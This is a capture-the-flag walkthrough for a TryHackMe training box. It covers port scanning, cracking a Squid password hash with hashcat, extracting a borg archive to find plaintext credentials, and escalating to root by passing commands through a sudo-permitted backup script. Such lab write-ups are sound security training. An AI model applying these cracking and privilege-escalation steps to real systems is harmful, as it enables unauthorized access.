---
title: Walkthrough - Cyborg	
published: true
---

A box involving encrypted archives, source code analysis and more.

[https://tryhackme.com/room/cyborgt8](https://tryhackme.com/room/cyborgt8)

* * *

## Scan the machine, how many ports are open?

- ``sudo nmap -T4 -F 10.10.173.237``

* * *

## What service is running on port 22?

- ``sudo nmap -sV -sT -p22,80 10.10.173.237``

* * *

## What service is running on port 80?

- ``sudo nmap -sV -sT -p22,80 10.10.173.237``

* * *

## What is the user.txt flag?

In ``/etc/squid`` found a passwd file with an MD5 (APR) hash - cracked ``hashcat -m 1600 music_archive.hash /usr/share/seclists/Passwords/rockyou.txt`` - squidward

- Website is running Squid Proxy?
- Downloaded archive from ``/admin/`` and extract
- this is a borg archive hence cyborg, so can install borg and extract
- ``borg extract final_archive::music_archive`` with the pass we got 

```shell
┌──(0xskar㉿cocokali)-[~/…/dev/home/alex/Documents]
└─$ cat note.txt   
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

* * *

## What is the root.txt flag?

```shell
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

- backup.sh isnt writable. but checking out the script we can pass it commands.
- ``sudo /etc/mp3backups/backup.sh -c 'ls -las /root'`` 
- ``sudo /etc/mp3backups/backup.sh -c 'cat /root/root.txt'``

* * * 